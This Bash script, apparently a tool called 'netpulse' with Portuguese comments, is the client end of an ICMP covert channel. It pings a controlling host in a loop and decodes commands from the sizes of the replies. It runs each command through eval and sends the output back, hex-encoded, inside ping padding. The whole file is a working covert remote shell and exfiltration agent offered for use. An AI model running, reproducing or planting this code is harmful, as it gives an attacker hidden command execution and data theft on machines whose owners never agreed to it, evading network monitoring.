#!/bin/bash

version="0.0.1"

# define os valores padrão para as variavéis
ping_timeout=0.5
verification=true
max_padding_size=15
check_failed=false

show_help() {
    echo '   _   _  _____ ___________ _   _ _      _____ _____  '
    echo '   | \ | ||  ___|_   _| ___ \ | | | |    /  ___|  ___|'
    echo '   |  \| || |__   | | | |_/ / | | | |    \ `--.| |__  '
    echo '   | . ` ||  __|  | | |  __/| | | | |     `--. \  __| '
    echo '   | |\  || |___  | | | |   | |_| | |____/\__/ / |___ '
    echo '   \_| \_/\____/  \_/ \_|    \___/\_____/\____/\____/ '
    echo ""
    echo "   v$version - github.com/thekh40s/netpulse           "
    echo "                                                      "
    echo ""
    echo "usage: $0 [options] <host>"
    echo ""
    echo "  -h                  display this help message and exit"
    echo "  -t <sec>            default ping timeout"
    echo "  -n                  do not perform integrity check"
    echo "  -p <size>           maximum packet size in bytes to send"
    echo "  -T <sec>            set a timeout in seconds for commands"
    echo "                      (recommended to prevent the shell from freezing)."
}

# configura as opções da linha de comando
while getopts "ht:np:T:" opt; do
    case $opt in
    h)
        show_help
        exit 0
        ;;
    t)
        ping_timeout="$OPTARG"
        ;;
    p)
        max_padding_size="$OPTARG"
        ;;
    n)
        verification=false
        ;;
    T)
        command_timeout="$OPTARG"
        ;;
    \?)
        show_help
        exit 1
        ;;
    esac
done

# remover as opções processadas dos argumentos
shift $((OPTIND - 1))

# verifica se o usuário especificou um <host>
if [ $# -eq 0 ]; then
    echo "Error: the <host> is required." >&2
    show_help
    exit 1
fi

host="$1"

check_payload() {
    # verifica se $1 é um valor inteiro válido
    local value="$1"
    if [[ "$value" =~ ^[0-9]+$ ]]; then
        return 0
    else
        return 1
    fi
}

listener() {
    pkt_send=1
    while [ true ]; do
        echo -n "[*] Waiting for a response from the host ($host)... $pkt_send" $'packets sent\r'

        # loop que envia ICMP echo requests até que
        # tenha alguma resposta do host
        payload_len=$(ping -n -W $ping_timeout -c 1 $host 2>/dev/null | grep "bytes from" | cut -d " " -f1)
        ((pkt_send+=1))
        if check_payload "$payload_len"; then
            # o primeiro pacote enviado pelo host não deve conter
            # um payload.
            # então os bytes do primeiro pacote são bytes que
            # não fazem parte do payload.
            # ele é subtraido do tamanho dos proximos pacotes
            # assim a máquina consegue saber o tamanho exato do payload.
            # esse valor fica armazenado na variavél $u_bytes
            # e é chamado de bytes insignificantes
            u_bytes=$payload_len
            echo "[+] Connection established."
            echo "[-] $u_bytes insignificant bytes in the packets."
            break
        fi
    done
    while [ true ]; do
        # captura a mensagem em decimal com base no tamanho dos pacotes
        payload_len=$(ping -n -W $ping_timeout -c 1 $host 2>/dev/null | grep "bytes from" | cut -d " " -f1)
        # o tamanho do pacote capturado é válido?
        if check_payload "$payload_len"; then
            # remove os bytes insignificantes
            payload_len=$(($payload_len - $u_bytes))
            # adiciona a $payload
            payload="$payload $payload_len"

            # caso o tamanho do pacote seja igual a zero, ou seja
            # não tenha um payload, isso signfica que a trasmissão
            # de dados do host foi terminada
            if [ $payload_len -eq 0 ]; then
                payload=($payload)

                # transforma todos os decimais capturados em caracteres ASCII
                # e adiciona a $command
                for dec in "${payload[@]}"; do
                    if [ $dec -eq 0 ]; then
                        break
                    fi
                    char=$(printf "\\$(printf '%03o' "$dec")")
                    command="${command}${char}"
                done

                # pega a parte responsavél pelo checksum
                checksum=$(echo -n "$command" | cut -d ":" -f1)

                command=$(echo -n "$command" | cut -d ":" -f2-)

                echo "[-] Command received from the host ($host): $command"

                # verifica se a verificação checksum está habilitada
                # e se o valor de checksum recebido pelo host não é um '#'
                if [ $verification == true ] && [ "$checksum" != "#" ]; then
                    # calcula o hash e compara
                    result=$(echo -n "$command" | sha1sum | cut -d " " -f1)
                    if [ "$result" != "$checksum" ]; then
                        echo "[!] Error occurred during checksum verification! [ $result != $checksum ]"
                        # caso o hash não sejam iguais, a máquina envia
                        # uma mensagem ao host dizendo que houve um erro de
                        # verificação e que o comando não pode ser executado
                        output="[NETPULSE MESSAGE] Command cannot be executed because the target-side checksum failed."
                        check_failed=true
                    fi
                fi

                # verifica se não houve erros de verificação
                if [ $check_failed == false ]; then
                    if [ -z $command_timeout ]; then
                        output=$(eval "$command" 2>&1)
                    else
                        output=$(eval "timeout --preserve-status -s 9 $command_timeout $command" 2>&1)
                    fi
                else
                    check_failed=false
                fi

                # calcula o hash do $output para enviar ao host
                # se a verificação não estiver desabilitada
                if [ $verification == true ]; then
                    data_checksum=$(echo -n "$output" | sha1sum | cut -d " " -f1)
                else
                    data_checksum="#"
                fi

                output="$data_checksum:$output"

                # pega o tamanho do payload
                output_size=${#output}

                echo "Sending $output_size bytes to the host..."

                # envia os bytes em pedaços para o host
                # o tamanho máximo de um pedaço é definido por $max_padding_size
                for ((i = 0; i < output_size; i += max_padding_size)); do
                    padding="${output:$i:$max_padding_size}"
                    padding_size=${#padding}

                    # converte uma parte saída do comando para hexadecimal
                    hex_padding=$(printf '%s' "$padding" | xxd -p | tr -d '\n')

                    ping -n -c 1 -q -p "$hex_padding" -s $padding_size $host >/dev/null
                done

                ping -n -c 1 -s 0 $host >/dev/null
            
                # reseta as variavéis para o valor padrão
                payload=""
                command=""
                output=""

                echo "[+] Output transmission complete."
            fi
        fi

    done
}

listener
